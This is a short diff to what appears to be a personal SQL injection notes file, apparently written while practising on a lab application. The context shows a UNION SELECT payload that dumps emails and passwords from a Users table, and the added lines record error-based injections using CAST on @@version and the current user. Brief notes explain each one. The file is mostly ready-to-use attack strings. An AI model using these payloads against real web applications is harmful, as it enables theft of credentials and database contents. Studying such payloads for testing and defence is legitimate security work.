@@ -26,3 +26,13 @@
 	'))+UNION+SELECT+Email,Password,'3','4','5','6','7','8','9'+FROM+Users--
 
 		NOTE: this injection worked by closing the query, and subsequant double parenthesis of a WHERE clause.
+
+--- Cast data types ---
+	
+	select CAST(@@version as INT);
+
+		NOTE: this injected can be used to return a select statement in the contents of an error message.
+
+	select CAST((select user) as INT);
+
+		NOTE: this injected can be used to return a select statement in the contents of an error message.
